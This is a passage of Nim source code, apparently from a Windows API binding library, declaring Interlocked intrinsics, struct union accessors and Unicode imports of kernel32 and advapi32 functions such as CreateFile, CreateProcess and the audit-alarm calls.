"InterlockedAnd16", header: "&lt;windows.h&gt;".}proc InterlockedAnd64*(Destination: ptr LONGLONG, Value: LONGLONG): LONGLONG {.importc: "InterlockedAnd64", header: "&lt;windows.h&gt;".}proc InterlockedIncrement64*(Addend: ptr LONGLONG): LONGLONG {.importc: "InterlockedIncrement64", header: "&lt;windows.h&gt;".}proc InterlockedDecrement64*(Addend: ptr LONGLONG): LONGLONG {.importc: "InterlockedDecrement64", header: "&lt;windows.h&gt;".}proc InterlockedExchange64*(Target: ptr LONGLONG, Value: LONGLONG): LONGLONG {.importc: "InterlockedExchange64", header: "&lt;windows.h&gt;".}proc InterlockedExchangeAdd64*(Addend: ptr LONGLONG, Value: LONGLONG): LONGLONG {.importc: "InterlockedExchangeAdd64", header: "&lt;windows.h&gt;".}proc InterlockedCompareExchange64*(Destination: ptr LONGLONG, ExChange: LONGLONG, Comperand: LONGLONG): LONGLONG {.importc: "InterlockedCompareExchange64", header: "&lt;windows.h&gt;".}proc InterlockedCompare64Exchange128*(Destination: ptr LONG64, ExchangeHigh: LONG64, ExchangeLow: LONG64, Comperand: LONG64): LONG64 {.importc: "InterlockedCompare64Exchange128", header: "&lt;windows.h&gt;".}proc InterlockedIncrement*(Addend: ptr LONG): LONG {.importc: "InterlockedIncrement", header: "&lt;windows.h&gt;".}proc InterlockedDecrement*(Addend: ptr LONG): LONG {.importc: "InterlockedDecrement", header: "&lt;windows.h&gt;".}proc InterlockedExchange*(Target: ptr LONG, Value: LONG): LONG {.importc: "InterlockedExchange", header: "&lt;windows.h&gt;".}proc InterlockedExchangeAdd*(Addend: ptr LONG, Value: LONG): LONG {.importc: "InterlockedExchangeAdd", header: "&lt;windows.h&gt;".}proc InterlockedCompareExchange*(Destination: ptr LONG, ExChange: LONG, Comperand: LONG): LONG {.importc: "InterlockedCompareExchange", header: "&lt;windows.h&gt;".}proc InterlockedExchangePointer*(Target: ptr PVOID, Value: PVOID): PVOID {.importc: "InterlockedExchangePointer", header: "&lt;windows.h&gt;".}proc InterlockedCompareExchangePointer*(Destination: ptr PVOID, ExChange: PVOID, Comperand: PVOID): PVOID {.importc: "InterlockedCompareExchangePointer", header: "&lt;windows.h&gt;".}proc `Offset=`*(self: var OVERLAPPED, x: DWORD) {.inline.} = self.union1.struct1.Offset = xproc Offset*(self: OVERLAPPED): DWORD {.inline.} = self.union1.struct1.Offsetproc Offset*(self: var OVERLAPPED): var DWORD {.inline.} = self.union1.struct1.Offsetproc `OffsetHigh=`*(self: var OVERLAPPED, x: DWORD) {.inline.} = self.union1.struct1.OffsetHigh = xproc OffsetHigh*(self: OVERLAPPED): DWORD {.inline.} = self.union1.struct1.OffsetHighproc OffsetHigh*(self: var OVERLAPPED): var DWORD {.inline.} = self.union1.struct1.OffsetHighproc `Pointer=`*(self: var OVERLAPPED, x: PVOID) {.inline.} = self.union1.Pointer = xproc Pointer*(self: OVERLAPPED): PVOID {.inline.} = self.union1.Pointerproc Pointer*(self: var OVERLAPPED): var PVOID {.inline.} = self.union1.Pointerproc `Block=`*(self: var PROCESS_HEAP_ENTRY, x: PROCESS_HEAP_ENTRY_UNION1_Block) {.inline.} = self.union1.Block = xproc Block*(self: PROCESS_HEAP_ENTRY): PROCESS_HEAP_ENTRY_UNION1_Block {.inline.} = self.union1.Blockproc Block*(self: var PROCESS_HEAP_ENTRY): var PROCESS_HEAP_ENTRY_UNION1_Block {.inline.} = self.union1.Blockproc `Region=`*(self: var PROCESS_HEAP_ENTRY, x: PROCESS_HEAP_ENTRY_UNION1_Region) {.inline.} = self.union1.Region = xproc Region*(self: PROCESS_HEAP_ENTRY): PROCESS_HEAP_ENTRY_UNION1_Region {.inline.} = self.union1.Regionproc Region*(self: var PROCESS_HEAP_ENTRY): var PROCESS_HEAP_ENTRY_UNION1_Region {.inline.} = self.union1.Regionproc `dwOemId=`*(self: var SYSTEM_INFO, x: DWORD) {.inline.} = self.union1.dwOemId = xproc dwOemId*(self: SYSTEM_INFO): DWORD {.inline.} = self.union1.dwOemIdproc dwOemId*(self: var SYSTEM_INFO): var DWORD {.inline.} = self.union1.dwOemIdproc `wProcessorArchitecture=`*(self: var SYSTEM_INFO, x: WORD) {.inline.} = self.union1.struct1.wProcessorArchitecture = xproc wProcessorArchitecture*(self: SYSTEM_INFO): WORD {.inline.} = self.union1.struct1.wProcessorArchitectureproc wProcessorArchitecture*(self: var SYSTEM_INFO): var WORD {.inline.} = self.union1.struct1.wProcessorArchitectureproc `wReserved=`*(self: var SYSTEM_INFO, x: WORD) {.inline.} = self.union1.struct1.wReserved = xproc wReserved*(self: SYSTEM_INFO): WORD {.inline.} = self.union1.struct1.wReservedproc wReserved*(self: var SYSTEM_INFO): var WORD {.inline.} = self.union1.struct1.wReservedproc `FileId=`*(self: var FILE_ID_DESCRIPTOR, x: LARGE_INTEGER) {.inline.} = self.union1.FileId = xproc FileId*(self: FILE_ID_DESCRIPTOR): LARGE_INTEGER {.inline.} = self.union1.FileIdproc FileId*(self: var FILE_ID_DESCRIPTOR): var LARGE_INTEGER {.inline.} = self.union1.FileIdproc `ObjectId=`*(self: var FILE_ID_DESCRIPTOR, x: GUID) {.inline.} = self.union1.ObjectId = xproc objectId*(self: FILE_ID_DESCRIPTOR): GUID {.inline.} = self.union1.ObjectIdproc objectId*(self: var FILE_ID_DESCRIPTOR): var GUID {.inline.} = self.union1.ObjectIdproc `ExtendedFileId=`*(self: var FILE_ID_DESCRIPTOR, x: FILE_ID_128) {.inline.} = self.union1.ExtendedFileId = xproc ExtendedFileId*(self: FILE_ID_DESCRIPTOR): FILE_ID_128 {.inline.} = self.union1.ExtendedFileIdproc ExtendedFileId*(self: var FILE_ID_DESCRIPTOR): var FILE_ID_128 {.inline.} = self.union1.ExtendedFileIdwhen winimUnicode:  type    WIN32_FIND_DATA* = WIN32_FIND_DATAW    PWIN32_FIND_DATA* = PWIN32_FIND_DATAW    LPWIN32_FIND_DATA* = LPWIN32_FIND_DATAW    ENUMRESLANGPROC* = ENUMRESLANGPROCW    ENUMRESNAMEPROC* = ENUMRESNAMEPROCW    ENUMRESTYPEPROC* = ENUMRESTYPEPROCW    PGET_MODULE_HANDLE_EX* = PGET_MODULE_HANDLE_EXW    STARTUPINFO* = STARTUPINFOW    LPSTARTUPINFO* = LPSTARTUPINFOW    STARTUPINFOEX* = STARTUPINFOEXW    LPSTARTUPINFOEX* = LPSTARTUPINFOEXW    HW_PROFILE_INFO* = HW_PROFILE_INFOW    LPHW_PROFILE_INFO* = LPHW_PROFILE_INFOW    ACTCTX* = ACTCTXW    PACTCTX* = PACTCTXW    PCACTCTX* = PCACTCTXW  const    GET_SYSTEM_WOW64_DIRECTORY_NAME_T_A* = GET_SYSTEM_WOW64_DIRECTORY_NAME_W_A    GET_SYSTEM_WOW64_DIRECTORY_NAME_T_W* = GET_SYSTEM_WOW64_DIRECTORY_NAME_W_W    GET_SYSTEM_WOW64_DIRECTORY_NAME_T_T* = GET_SYSTEM_WOW64_DIRECTORY_NAME_W_T  proc DefineDosDevice*(dwFlags: DWORD, lpDeviceName: LPCWSTR, lpTargetPath: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "DefineDosDeviceW".}  proc DeleteVolumeMountPoint*(lpszVolumeMountPoint: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "DeleteVolumeMountPointW".}  proc FindFirstVolume*(lpszVolumeName: LPWSTR, cchBufferLength: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "FindFirstVolumeW".}  proc FindNextVolume*(hFindVolume: HANDLE, lpszVolumeName: LPWSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "FindNextVolumeW".}  proc GetLogicalDriveStrings*(nBufferLength: DWORD, lpBuffer: LPWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetLogicalDriveStringsW".}  proc GetShortPathName*(lpszLongPath: LPCWSTR, lpszShortPath: LPWSTR, cchBuffer: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetShortPathNameW".}  proc GetTempFileName*(lpPathName: LPCWSTR, lpPrefixString: LPCWSTR, uUnique: UINT, lpTempFileName: LPWSTR): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetTempFileNameW".}  proc GetVolumeInformation*(lpRootPathName: LPCWSTR, lpVolumeNameBuffer: LPWSTR, nVolumeNameSize: DWORD, lpVolumeSerialNumber: LPDWORD, lpMaximumComponentLength: LPDWORD, lpFileSystemFlags: LPDWORD, lpFileSystemNameBuffer: LPWSTR, nFileSystemNameSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetVolumeInformationW".}  proc GetVolumePathName*(lpszFileName: LPCWSTR, lpszVolumePathName: LPWSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetVolumePathNameW".}  proc QueryDosDevice*(lpDeviceName: LPCWSTR, lpTargetPath: LPWSTR, ucchMax: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "QueryDosDeviceW".}  proc GetVolumeNameForVolumeMountPoint*(lpszVolumeMountPoint: LPCWSTR, lpszVolumeName: LPWSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetVolumeNameForVolumeMountPointW".}  proc GetVolumePathNamesForVolumeName*(lpszVolumeName: LPCWSTR, lpszVolumePathNames: LPWCH, cchBufferLength: DWORD, lpcchReturnLength: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetVolumePathNamesForVolumeNameW".}  proc GetTempPath*(nBufferLength: DWORD, lpBuffer: LPWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetTempPathW".}  proc FindResourceEx*(hModule: HMODULE, lpType: LPCWSTR, lpName: LPCWSTR, wLanguage: WORD): HRSRC {.winapi, stdcall, dynlib: "kernel32", importc: "FindResourceExW".}  proc CreateFileMapping*(hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateFileMappingW".}  proc OpenFileMapping*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "OpenFileMappingW".}  proc CreateFileMappingNuma*(hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCWSTR, nndPreferred: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateFileMappingNumaW".}  proc CreateNamedPipe*(lpName: LPCWSTR, dwOpenMode: DWORD, dwPipeMode: DWORD, nMaxInstances: DWORD, nOutBufferSize: DWORD, nInBufferSize: DWORD, nDefaultTimeOut: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateNamedPipeW".}  proc WaitNamedPipe*(lpNamedPipeName: LPCWSTR, nTimeOut: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "WaitNamedPipeW".}  proc GetNamedPipeClientComputerName*(Pipe: HANDLE, ClientComputerName: LPWSTR, ClientComputerNameLength: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetNamedPipeClientComputerNameW".}  proc CreatePrivateNamespace*(lpPrivateNamespaceAttributes: LPSECURITY_ATTRIBUTES, lpBoundaryDescriptor: LPVOID, lpAliasPrefix: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreatePrivateNamespaceW".}  proc CreateBoundaryDescriptor*(Name: LPCWSTR, Flags: ULONG): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateBoundaryDescriptorW".}  proc GetEnvironmentStrings*(): LPWCH {.winapi, stdcall, dynlib: "kernel32", importc: "GetEnvironmentStringsW".}  proc SetEnvironmentStrings*(NewEnvironment: LPWCH): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetEnvironmentStringsW".}  proc GetStartupInfo*(lpStartupInfo: LPSTARTUPINFOW): VOID {.winapi, stdcall, dynlib: "kernel32", importc: "GetStartupInfoW".}  proc CreateProcessAsUser*(hToken: HANDLE, lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR, lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "CreateProcessAsUserW".}  proc AccessCheckAndAuditAlarm*(SubsystemName: LPCWSTR, HandleId: LPVOID, ObjectTypeName: LPWSTR, ObjectName: LPWSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, DesiredAccess: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccess: LPDWORD, AccessStatus: LPBOOL, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "AccessCheckAndAuditAlarmW".}  proc AccessCheckByTypeAndAuditAlarm*(SubsystemName: LPCWSTR, HandleId: LPVOID, ObjectTypeName: LPCWSTR, ObjectName: LPCWSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, PrincipalSelfSid: PSID, DesiredAccess: DWORD, AuditType: AUDIT_EVENT_TYPE, Flags: DWORD, ObjectTypeList: POBJECT_TYPE_LIST, ObjectTypeListLength: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccess: LPDWORD, AccessStatus: LPBOOL, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "AccessCheckByTypeAndAuditAlarmW".}  proc AccessCheckByTypeResultListAndAuditAlarm*(SubsystemName: LPCWSTR, HandleId: LPVOID, ObjectTypeName: LPCWSTR, ObjectName: LPCWSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, PrincipalSelfSid: PSID, DesiredAccess: DWORD, AuditType: AUDIT_EVENT_TYPE, Flags: DWORD, ObjectTypeList: POBJECT_TYPE_LIST, ObjectTypeListLength: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccessList: LPDWORD, AccessStatusList: LPDWORD, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "AccessCheckByTypeResultListAndAuditAlarmW".}  proc AccessCheckByTypeResultListAndAuditAlarmByHandle*(SubsystemName: LPCWSTR, HandleId: LPVOID, ClientToken: HANDLE, ObjectTypeName: LPCWSTR, ObjectName: LPCWSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, PrincipalSelfSid: PSID, DesiredAccess: DWORD, AuditType: AUDIT_EVENT_TYPE, Flags: DWORD, ObjectTypeList: POBJECT_TYPE_LIST, ObjectTypeListLength: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccessList: LPDWORD, AccessStatusList: LPDWORD, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "AccessCheckByTypeResultListAndAuditAlarmByHandleW".}  proc GetFileSecurity*(lpFileName: LPCWSTR, RequestedInformation: SECURITY_INFORMATION, pSecurityDescriptor: PSECURITY_DESCRIPTOR, nLength: DWORD, lpnLengthNeeded: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "GetFileSecurityW".}  proc ObjectCloseAuditAlarm*(SubsystemName: LPCWSTR, HandleId: LPVOID, GenerateOnClose: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "ObjectCloseAuditAlarmW".}  proc ObjectDeleteAuditAlarm*(SubsystemName: LPCWSTR, HandleId: LPVOID, GenerateOnClose: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "ObjectDeleteAuditAlarmW".}  proc ObjectOpenAuditAlarm*(SubsystemName: LPCWSTR, HandleId: LPVOID, ObjectTypeName: LPWSTR, ObjectName: LPWSTR, pSecurityDescriptor: PSECURITY_DESCRIPTOR, ClientToken: HANDLE, DesiredAccess: DWORD, GrantedAccess: DWORD, Privileges: PPRIVILEGE_SET, ObjectCreation: WINBOOL, AccessGranted: WINBOOL, GenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "ObjectOpenAuditAlarmW".}  proc ObjectPrivilegeAuditAlarm*(SubsystemName: LPCWSTR, HandleId: LPVOID, ClientToken: HANDLE, DesiredAccess: DWORD, Privileges: PPRIVILEGE_SET, AccessGranted: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "ObjectPrivilegeAuditAlarmW".}  proc PrivilegedServiceAuditAlarm*(SubsystemName: LPCWSTR, ServiceName: LPCWSTR, ClientToken: HANDLE, Privileges: PPRIVILEGE_SET, AccessGranted: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "PrivilegedServiceAuditAlarmW".}  proc SetFileSecurity*(lpFileName: LPCWSTR, SecurityInformation: SECURITY_INFORMATION, pSecurityDescriptor: PSECURITY_DESCRIPTOR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "SetFileSecurityW".}  proc CreateSemaphoreEx*(lpSemaphoreAttributes: LPSECURITY_ATTRIBUTES, lInitialCount: LONG, lMaximumCount: LONG, lpName: LPCWSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateSemaphoreExW".}  proc OpenMutex*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "OpenMutexW".}  proc OpenSemaphore*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "OpenSemaphoreW".}  proc CreateWaitableTimerEx*(lpTimerAttributes: LPSECURITY_ATTRIBUTES, lpTimerName: LPCWSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateWaitableTimerExW".}  proc OpenWaitableTimer*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpTimerName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "OpenWaitableTimerW".}  proc SetComputerNameEx*(NameType: COMPUTER_NAME_FORMAT, lpBuffer: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetComputerNameExW".}  proc OutputDebugString*(lpOutputString: LPCWSTR): VOID {.winapi, stdcall, dynlib: "kernel32", importc: "OutputDebugStringW".}  proc CreateFile*(lpFileName: LPCWSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateFileW".}  proc FindFirstChangeNotification*(lpPathName: LPCWSTR, bWatchSubtree: WINBOOL, dwNotifyFilter: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "FindFirstChangeNotificationW".}  proc FindFirstFile*(lpFileName: LPCWSTR, lpFindFileData: LPWIN32_FIND_DATAW): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "FindFirstFileW".}  proc GetDiskFreeSpace*(lpRootPathName: LPCWSTR, lpSectorsPerCluster: LPDWORD, lpBytesPerSector: LPDWORD, lpNumberOfFreeClusters: LPDWORD, lpTotalNumberOfClusters: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetDiskFreeSpaceW".}  proc GetDriveType*(lpRootPathName: LPCWSTR): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetDriveTypeW".}  proc GetFileAttributes*(lpFileName: LPCWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetFileAttributesW".}  proc GetFullPathName*(lpFileName: LPCWSTR, nBufferLength: DWORD, lpBuffer: LPWSTR, lpFilePart: ptr LPWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetFullPathNameW".}  proc GetLongPathName*(lpszShortPath: LPCWSTR, lpszLongPath: LPWSTR, cchBuffer: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetLongPathNameW".}  proc GetFinalPathNameByHandle*(hFile: HANDLE, lpszFilePath: LPWSTR, cchFilePath: DWORD, dwFlags: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetFinalPathNameByHandleW".}  proc CreateDirectory*(lpPathName: LPCWSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CreateDirectoryW".}  proc DeleteFile*(lpFileName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "DeleteFileW".}  proc FindFirstFileEx*(lpFileName: LPCWSTR, fInfoLevelId: FINDEX_INFO_LEVELS, lpFindFileData: LPVOID, fSearchOp: FINDEX_SEARCH_OPS, lpSearchFilter: LPVOID, dwAdditionalFlags: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "FindFirstFileExW".}  proc FindNextFile*(hFindFile: HANDLE, lpFindFileData: LPWIN32_FIND_DATAW): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "FindNextFileW".}  proc GetDiskFreeSpaceEx*(lpDirectoryName: LPCWSTR, lpFreeBytesAvailableToCaller: PULARGE_INTEGER, lpTotalNumberOfBytes: PULARGE_INTEGER, lpTotalNumberOfFreeBytes: PULARGE_INTEGER): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetDiskFreeSpaceExW".}  proc GetFileAttributesEx*(lpFileName: LPCWSTR, fInfoLevelId: GET_FILEEX_INFO_LEVELS, lpFileInformation: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetFileAttributesExW".}  proc RemoveDirectory*(lpPathName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "RemoveDirectoryW".}  proc SetFileAttributes*(lpFileName: LPCWSTR, dwFileAttributes: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetFileAttributesW".}  proc GetModuleHandleEx*(dwFlags: DWORD, lpModuleName: LPCWSTR, phModule: ptr HMODULE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetModuleHandleExW".}  proc LoadString*(hInstance: HINSTANCE, uID: UINT, lpBuffer: LPWSTR, cchBufferMax: int32): int32 {.winapi, stdcall, dynlib: "user32", importc: "LoadStringW".}  proc GetModuleFileName*(hModule: HMODULE, lpFilename: LPWSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetModuleFileNameW".}  proc GetModuleHandle*(lpModuleName: LPCWSTR): HMODULE {.winapi, stdcall, dynlib: "kernel32", importc: "GetModuleHandleW".}  proc LoadLibraryEx*(lpLibFileName: LPCWSTR, hFile: HANDLE, dwFlags: DWORD): HMODULE {.winapi, stdcall, dynlib: "kernel32", importc: "LoadLibraryExW".}  proc EnumResourceLanguages*(hModule: HMODULE, lpType: LPCWSTR, lpName: LPCWSTR, lpEnumFunc: ENUMRESLANGPROCW, lParam: LONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "EnumResourceLanguagesW".}  proc EnumResourceLanguagesEx*(hModule: HMODULE, lpType: LPCWSTR, lpName: LPCWSTR, lpEnumFunc: ENUMRESLANGPROCW, lParam: LONG_PTR, dwFlags: DWORD, LangId: LANGID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "EnumResourceLanguagesExW".}  proc EnumResourceNamesEx*(hModule: HMODULE, lpType: LPCWSTR, lpEnumFunc: ENUMRESNAMEPROCW, lParam: LONG_PTR, dwFlags: DWORD, LangId: LANGID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "EnumResourceNamesExW".}  proc EnumResourceTypesEx*(hModule: HMODULE, lpEnumFunc: ENUMRESTYPEPROCW, lParam: LONG_PTR, dwFlags: DWORD, LangId: LANGID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "EnumResourceTypesExW".}  proc ExpandEnvironmentStrings*(lpSrc: LPCWSTR, lpDst: LPWSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "ExpandEnvironmentStringsW".}  proc FreeEnvironmentStrings*(penv: LPWCH): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "FreeEnvironmentStringsW".}  proc GetCommandLine*(): LPWSTR {.winapi, stdcall, dynlib: "kernel32", importc: "GetCommandLineW".}  proc GetCurrentDirectory*(nBufferLength: DWORD, lpBuffer: LPWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetCurrentDirectoryW".}  proc GetEnvironmentVariable*(lpName: LPCWSTR, lpBuffer: LPWSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetEnvironmentVariableW".}  proc NeedCurrentDirectoryForExePath*(ExeName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "NeedCurrentDirectoryForExePathW".}  proc SearchPath*(lpPath: LPCWSTR, lpFileName: LPCWSTR, lpExtension: LPCWSTR, nBufferLength: DWORD, lpBuffer: LPWSTR, lpFilePart: ptr LPWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "SearchPathW".}  proc SetCurrentDirectory*(lpPathName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetCurrentDirectoryW".}  proc SetEnvironmentVariable*(lpName: LPCWSTR, lpValue: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetEnvironmentVariableW".}  proc CreateProcess*(lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR, lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CreateProcessW".}  proc CreateMutexEx*(lpMutexAttributes: LPSECURITY_ATTRIBUTES, lpName: LPCWSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateMutexExW".}  proc CreateEventEx*(lpEventAttributes: LPSECURITY_ATTRIBUTES, lpName: LPCWSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateEventExW".}  proc OpenEvent*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "OpenEventW".}  proc CreateMutex*(lpMutexAttributes: LPSECURITY_ATTRIBUTES, bInitialOwner: WINBOOL, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateMutexW".}  proc CreateEvent*(lpEventAttributes: LPSECURITY_ATTRIBUTES, bManualReset: WINBOOL, bInitialState: WINBOOL, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateEventW".}  proc GetSystemDirectory*(lpBuffer: LPWSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetSystemDirectoryW".}  proc GetWindowsDirectory*(lpBuffer: LPWSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetWindowsDirectoryW".}  proc GetSystemWindowsDirectory*(lpBuffer: LPWSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetSystemWindowsDirectoryW".}  proc GetComputerNameEx*(NameType: COMPUTER_NAME_FORMAT, lpBuffer: LPWSTR, nSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetComputerNameExW".}  proc GetVersionEx*(lpVersionInformation: LPOSVERSIONINFOW): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetVersionExW".}  proc GetBinaryType*(lpApplicationName: LPCWSTR, lpBinaryType: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetBinaryTypeW".}  proc GetLongPathNameTransacted*(lpszShortPath: LPCWSTR, lpszLongPath: LPWSTR, cchBuffer: DWORD, hTransaction: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetLongPathNameTransactedW".}  proc SetFileShortName*(hFile: HANDLE, lpShortName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetFileShortNameW".}  proc FormatMessage*(dwFlags: DWORD, lpSource: LPCVOID, dwMessageId: DWORD, dwLanguageId: DWORD, lpBuffer: LPWSTR, nSize: DWORD, Arguments: ptr va_list): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "FormatMessageW".}  proc CreateMailslot*(lpName: LPCWSTR, nMaxMessageSize: DWORD, lReadTimeout: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateMailslotW".}  proc EncryptFile*(lpFileName: LPCWSTR): 